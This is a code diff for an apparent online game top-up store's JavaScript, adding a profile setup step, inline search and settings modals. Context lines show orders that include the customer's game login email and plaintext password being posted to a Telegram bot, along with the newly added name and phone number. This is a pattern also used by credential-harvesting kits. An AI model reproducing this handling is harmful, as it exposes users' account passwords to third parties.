@@ -1,20 +1,163 @@
 document.addEventListener('DOMContentLoaded', () => {
     
     // ==========================================
-    // INTRO ANIMATION TIMING ENGINE
+    // PROFILE (STEP 1) + INTRO ANIMATION GATE
     // ==========================================
-    const introOverlayNode = document.getElementById("animation-container");
-    if (introOverlayNode) {
-        setTimeout(() => {
-            introOverlayNode.style.opacity = "0";
+    const PHONE_REGEX = /^01[0-9]{9}$/; // exactly 11 digits, starts with 01
+
+    function getSavedProfile() {
+        return {
+            username: localStorage.getItem('shetos_username') || '',
+            phone: localStorage.getItem('shetos_phone') || ''
+        };
+    }
+
+    function saveProfile(username, phone) {
+        localStorage.setItem('shetos_username', username);
+        localStorage.setItem('shetos_phone', phone);
+    }
+
+    function runIntroThenStore() {
+        const introOverlayNode = document.getElementById("animation-container");
+        if (introOverlayNode) {
+            introOverlayNode.style.display = "flex";
             setTimeout(() => {
-                introOverlayNode.remove();
-                document.body.style.overflow = "auto";
-                document.body.style.overflowX = "hidden";
-                syncInitialNavbarLayout();
-                routeTabView("#home");
-            }, 800); 
-        }, 3200); 
+                introOverlayNode.style.opacity = "0";
+                setTimeout(() => {
+                    introOverlayNode.remove();
+                    document.body.style.overflow = "auto";
+                    document.body.style.overflowX = "hidden";
+                }, 800);
+            }, 3200);
+        }
+    }
+
+    const profileSetupPage = document.getElementById('profile-setup-page');
+    const setupUsernameInput = document.getElementById('setup-username-input');
+    const setupPhoneInput = document.getElementById('setup-phone-input');
+    const setupPhoneError = document.getElementById('setup-phone-error');
+    const setupEnterBtn = document.getElementById('setup-enter-btn');
+
+    function validateSetupForm() {
+        const uname = setupUsernameInput.value.trim();
+        const phone = setupPhoneInput.value.trim();
+        const phoneValid = PHONE_REGEX.test(phone);
+
+        if (phone.length > 0 && !phoneValid) {
+            setupPhoneInput.classList.add('field-invalid');
+            setupPhoneError.classList.add('show');
+        } else {
+            setupPhoneInput.classList.remove('field-invalid');
+            setupPhoneError.classList.remove('show');
+        }
+
+        const ready = uname.length > 0 && phoneValid;
+        setupEnterBtn.disabled = !ready;
+        setupEnterBtn.classList.toggle('ready', ready);
+        return ready;
+    }
+
+    if (setupPhoneInput) {
+        setupPhoneInput.addEventListener('input', () => {
+            // Only allow digits
+            setupPhoneInput.value = setupPhoneInput.value.replace(/[^0-9]/g, '').slice(0, 11);
+            validateSetupForm();
+        });
+    }
+    if (setupUsernameInput) {
+        setupUsernameInput.addEventListener('input', validateSetupForm);
+    }
+
+    if (setupEnterBtn) {
+        setupEnterBtn.addEventListener('click', () => {
+            if (!validateSetupForm()) return;
+            const uname = setupUsernameInput.value.trim();
+            const phone = setupPhoneInput.value.trim();
+            saveProfile(uname, phone);
+            if (profileSetupPage) profileSetupPage.remove();
+            runIntroThenStore();
+        });
+    }
+
+    // Entry point: skip setup if a profile already exists, otherwise show it
+    const existingProfile = getSavedProfile();
+    if (existingProfile.username && PHONE_REGEX.test(existingProfile.phone)) {
+        if (profileSetupPage) profileSetupPage.remove();
+        runIntroThenStore();
+    }
+    // else: profile-setup-page stays visible (animation-container is display:none until then)
+
+    // ==========================================
+    // SETTINGS: PROFILE VIEW / EDIT (combined single button, auto-save)
+    // ==========================================
+    const profileDisplayView   = document.getElementById('profile-display-view');
+    const profileEditView      = document.getElementById('profile-edit-view');
+    const profileUsernameDisplay = document.getElementById('profile-username-display');
+    const profilePhoneDisplay    = document.getElementById('profile-phone-display');
+    const profileEditToggleBtn = document.getElementById('profile-edit-toggle-btn');
+    const profileUsernameField = document.getElementById('profile-username-field');
+    const profilePhoneField    = document.getElementById('profile-phone-field');
+    const profileEditError     = document.getElementById('profile-edit-error');
+    const profileSaveBtn       = document.getElementById('profile-save-btn');
+    const profileSaveStatus    = document.getElementById('profile-save-status');
+
+    function flashSaveStatus(text) {
+        if (!profileSaveStatus) return;
+        profileSaveStatus.textContent = text;
+        profileSaveStatus.classList.add('show');
+        setTimeout(() => profileSaveStatus.classList.remove('show'), 1600);
+    }
+
+    function loadProfileIntoSettings() {
+        const p = getSavedProfile();
+        if (profileUsernameDisplay) profileUsernameDisplay.textContent = p.username || '-';
+        if (profilePhoneDisplay) profilePhoneDisplay.textContent = p.phone || '-';
+        if (profileUsernameField) profileUsernameField.value = p.username;
+        if (profilePhoneField) profilePhoneField.value = p.phone;
+    }
+    loadProfileIntoSettings();
+
+    if (profileEditToggleBtn) {
+        profileEditToggleBtn.addEventListener('click', () => {
+            const p = getSavedProfile();
+            if (profileUsernameField) profileUsernameField.value = p.username;
+            if (profilePhoneField) profilePhoneField.value = p.phone;
+            if (profileEditError) profileEditError.classList.remove('show');
+            if (profileDisplayView) profileDisplayView.style.display = 'none';
+            if (profileEditView) profileEditView.style.display = 'flex';
+            if (profileUsernameField) profileUsernameField.focus();
+        });
+    }
+
+    if (profilePhoneField) {
+        profilePhoneField.addEventListener('input', () => {
+            profilePhoneField.value = profilePhoneField.value.replace(/[^0-9]/g, '').slice(0, 11);
+        });
+    }
+
+    if (profileSaveBtn) {
+        profileSaveBtn.addEventListener('click', () => {
+            const uname = (profileUsernameField.value || '').trim();
+            const phone = (profilePhoneField.value || '').trim();
+
+            if (uname.length === 0) {
+                profileEditError.textContent = 'Username cannot be empty';
+                profileEditError.classList.add('show');
+                return;
+            }
+            if (!PHONE_REGEX.test(phone)) {
+                profileEditError.textContent = 'Phone must be 11 digits and start with 01';
+                profileEditError.classList.add('show');
+                return;
+            }
+
+            saveProfile(uname, phone);
+            loadProfileIntoSettings();
+            if (profileEditError) profileEditError.classList.remove('show');
+            if (profileEditView) profileEditView.style.display = 'none';
+            if (profileDisplayView) profileDisplayView.style.display = 'flex';
+            flashSaveStatus('✔ Profile saved');
+        });
     }
 
     // ==========================================
@@ -333,7 +476,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         // Update search placeholder live
-        const searchInp = document.getElementById('store-search-input');
+        const searchInp = document.getElementById('top-search-input');
         if (searchInp) searchInp.placeholder = t('searchPlaceholder');
     }
 
@@ -522,120 +665,81 @@ document.addEventListener('DOMContentLoaded', () => {
     `;
 
     // ==========================================
-    // NAV / ROUTING
+    // TOP BAR: SEARCH (inline, filters home cards)
     // ==========================================
-    function inverseMousePosition(element, event) {
-        const rect = element.getBoundingClientRect();
-        const x = event.clientX - rect.left;
-        const y = event.clientY - rect.top;
-        return {
-            x1: -(x - rect.width / 2) / 20,
-            y1: -(y - rect.height / 2) / 20
-        };
-    }
+    const topSearchInput = document.getElementById('top-search-input');
+    const noGamesFoundMsg = document.getElementById('no-games-found');
 
-    function handleTabClick(event) {
-        const navNode = document.querySelector('.nav');
-        const targetLi = event.target.closest('li');
-        if (!targetLi) return;
-        const width = targetLi.offsetWidth;
-        const left = targetLi.getBoundingClientRect().left;
-        const offsetLeft = left - navNode.getBoundingClientRect().left;
-        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
-        targetLi.classList.add('active');
-        navNode.style.setProperty('--after-bg-position', offsetLeft);
-        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
-        navNode.style.setProperty('--after-bg-width', width);
-        const targetHash = event.target.getAttribute('href');
-        routeTabView(targetHash);
-    }
-
-    const premiumNav = document.querySelector('.nav');
-    if (premiumNav) {
-        const navLinks = premiumNav.querySelectorAll('li a');
-        for (let i = 0; i < navLinks.length; i++) {
-            navLinks[i].addEventListener('click', (e) => { e.preventDefault(); handleTabClick(e); });
-            navLinks[i].addEventListener("mousemove", (event) => {
-                const tilt = inverseMousePosition(event.target, event);
-                premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
-                premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
-            });
-        }
-    }
-
-    function syncInitialNavbarLayout() {
-        if (!storePage || !storePage.classList.contains('active')) return;
-        if (!premiumNav) return;
-        const activeLi = premiumNav.querySelector('ul li.active') || premiumNav.querySelector('ul li');
-        if (!activeLi) return;
-        const width = activeLi.offsetWidth;
-        const left = activeLi.getBoundingClientRect().left;
-        const offsetLeft = left - premiumNav.getBoundingClientRect().left;
-        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
-        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
-        premiumNav.style.setProperty('--after-bg-width', width);
-    }
-    window.addEventListener('resize', syncInitialNavbarLayout);
-
-    function routeTabView(hashTarget) {
-        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
-        if (hashTarget === "#home" || hashTarget === "") {
-            const homeSec = document.getElementById('home-content-section');
-            if (homeSec) homeSec.classList.add('active-view');
-        } else if (hashTarget === "#search") {
-            const searchSec = document.getElementById('search-content-section');
-            if (searchSec) searchSec.classList.add('active-view');
-            const searchInp = document.getElementById('store-search-input');
-            if (searchInp) searchInp.value = "";
-            processLiveSearchFilter("");
-        } else if (hashTarget === "#about") {
-            const aboutSec = document.getElementById('about-content-section');
-            if (aboutSec) aboutSec.classList.add('active-view');
-        } else if (hashTarget === "#setting") {
-            const settingSec = document.getElementById('setting-content-section');
-            if (settingSec) settingSec.classList.add('active-view');
-        }
-    }
-
-    // ==========================================
-    // SEARCH
-    // ==========================================
-    const searchInput = document.getElementById('store-search-input');
-    const searchResultsViewport = document.getElementById('search-results-viewport');
-
-    if (searchInput) {
-        searchInput.addEventListener('input', (e) => { processLiveSearchFilter(e.target.value); });
-    }
-
-    function processLiveSearchFilter(queryText) {
-        if (!searchResultsViewport) return;
+    function filterHomeGameCards(queryText) {
         const cleanedQuery = queryText.trim().toLowerCase();
-        searchResultsViewport.innerHTML = "";
-        if (cleanedQuery === "") {
-            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to filter...</div>`;
-            return;
-        }
         const sourceCards = document.querySelectorAll('#home-content-section .game-card');
         let matchesCount = 0;
         sourceCards.forEach(card => {
             const indexName = card.getAttribute('data-game-search-title') || "";
-            if (indexName.includes(cleanedQuery)) {
-                matchesCount++;
-                const clonedCard = card.cloneNode(true);
-                clonedCard.addEventListener('click', () => {
-                    if (indexName.includes("free fire"))   { currentGame = "FREE FIRE";    openFFTypeModal(); }
-                    else if (indexName.includes("pubg"))   { currentGame = "PUBG";          openProductsDirectly(); }
-                    else if (indexName.includes("call of duty")) { currentGame = "CALL OF DUTY"; openProductsDirectly(); }
-                    else if (indexName.includes("fifa"))   { currentGame = "FIFA MOBILE";  openProductsDirectly(); }
-                    else if (indexName.includes("pes"))    { currentGame = "PES MOBILE";   openProductsDirectly(); }
-                    else if (indexName.includes("blood strike")) { currentGame = "BLOOD STRIKE"; openProductsDirectly(); }
-                });
-                searchResultsViewport.appendChild(clonedCard);
-            }
+            const isMatch = cleanedQuery === "" || indexName.includes(cleanedQuery);
+            card.style.display = isMatch ? "" : "none";
+            if (isMatch) matchesCount++;
         });
-        if (matchesCount === 0) {
-            searchResultsViewport.innerHTML = `<div class="not-found-feedback">No Games Found for "${queryText}"</div>`;
-        }
+        if (noGamesFoundMsg) noGamesFoundMsg.style.display = matchesCount === 0 ? "block" : "none";
+    }
+
+    if (topSearchInput) {
+        topSearchInput.addEventListener('input', (e) => { filterHomeGameCards(e.target.value); });
+    }
+
+    // ==========================================
+    // TOP BAR: SETTINGS ICON → SETTINGS MODAL
+    // ==========================================
+    const settingsModal      = document.getElementById('settings-modal');
+    const topSettingsBtn     = document.getElementById('top-settings-btn');
+    const closeSettingsModal = document.getElementById('close-settings-modal');
+
+    if (topSettingsBtn) {
+        topSettingsBtn.addEventListener('click', () => {
+            loadProfileIntoSettings();
+            if (settingsModal) settingsModal.classList.add('active');
+        });
+    }
+    if (closeSettingsModal) {
+        closeSettingsModal.addEventListener('click', () => {
+            if (settingsModal) settingsModal.classList.remove('active');
+        });
+    }
+
+    // ==========================================
+    // SETTINGS: FEEDBACK MODAL (opens on top of settings)
+    // ==========================================
+    const feedbackModal          = document.getElementById('feedback-modal');
+    const openFeedbackModalBtn   = document.getElementById('open-feedback-modal-btn');
+    const closeFeedbackModalBtn  = document.getElementById('close-feedback-modal');
+
+    if (openFeedbackModalBtn) {
+        openFeedbackModalBtn.addEventListener('click', () => {
+            if (feedbackModal) feedbackModal.classList.add('active');
+        });
+    }
+    if (closeFeedbackModalBtn) {
+        closeFeedbackModalBtn.addEventListener('click', () => {
+            if (feedbackModal) feedbackModal.classList.remove('active');
+        });
+    }
+
+    // ==========================================
+    // SETTINGS: CONTACT US MODAL (opens on top of settings)
+    // ==========================================
+    const contactUsModal         = document.getElementById('contactus-modal');
+    const openContactUsModalBtn  = document.getElementById('open-contactus-modal-btn');
+    const closeContactUsModalBtn = document.getElementById('close-contactus-modal');
+
+    if (openContactUsModalBtn) {
+        openContactUsModalBtn.addEventListener('click', () => {
+            if (contactUsModal) contactUsModal.classList.add('active');
+        });
+    }
+    if (closeContactUsModalBtn) {
+        closeContactUsModalBtn.addEventListener('click', () => {
+            if (contactUsModal) contactUsModal.classList.remove('active');
+        });
     }
 
     // ==========================================
@@ -767,25 +871,8 @@ document.addEventListener('DOMContentLoaded', () => {
     // ==========================================
     // INPUT VALIDATION
     // ==========================================
-    // Strip any non-digit characters as the user types or pastes,
-    // so the Game ID field only ever contains numbers.
-    function sanitizeIdField() {
-        if (!idField) return;
-        const cursorPos = idField.selectionStart;
-        const originalLength = idField.value.length;
-        const digitsOnly = idField.value.replace(/[^0-9]/g, '');
-        if (digitsOnly !== idField.value) {
-            idField.value = digitsOnly;
-            // Keep the caret in a sensible position after stripping characters
-            const removedBeforeCursor = originalLength - digitsOnly.length;
-            const newPos = Math.max(0, (cursorPos || digitsOnly.length) - removedBeforeCursor);
-            idField.setSelectionRange(newPos, newPos);
-        }
-    }
-
     function validateIdInput() {
         if (!confirmIdBtn) return;
-        sanitizeIdField();
         const valid = idField && idField.value.trim().length > 4;
         confirmIdBtn.disabled = !valid;
         confirmIdBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
@@ -1002,7 +1089,10 @@ document.addEventListener('DOMContentLoaded', () => {
             userAccessInfoString = `📧 Login Email: ${authenticatedUserMeta.email}\n🔑 Account Password: ${authenticatedUserMeta.password}`;
         }
 
-        const botPayload = `🛒 NEW MARKET ORDER\n\n${userAccessInfoString}\n\n📦 SELECTED ITEMS:\n${productsMessageList}\n\n💰 TOTAL: ${overallCartTotal} EGP`;
+        const customerProfile = getSavedProfile();
+        const customerInfoString = `👤 Customer: ${customerProfile.username || 'N/A'}\n📞 Contact: ${customerProfile.phone || 'N/A'}`;
+
+        const botPayload = `🛒 NEW MARKET ORDER\n\n${customerInfoString}\n\n${userAccessInfoString}\n\n📦 SELECTED ITEMS:\n${productsMessageList}\n\n💰 TOTAL: ${overallCartTotal} EGP`;
         const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
         fetch(telegramApiUrl, {
@@ -1131,8 +1221,8 @@ document.addEventListener('DOMContentLoaded', () => {
     // ==========================================
     window.addEventListener('click', (e) => {
         if (e.target.classList.contains('modal-overlay')) {
-            // Don't reset basket when closing currency or language modal
-            if (e.target.id === 'currency-modal' || e.target.id === 'language-modal') {
+            // Don't reset basket when closing currency, language, settings, feedback or contact-us modal
+            if (['currency-modal', 'language-modal', 'settings-modal', 'feedback-modal', 'contactus-modal'].includes(e.target.id)) {
                 e.target.classList.remove('active');
                 return;
             }
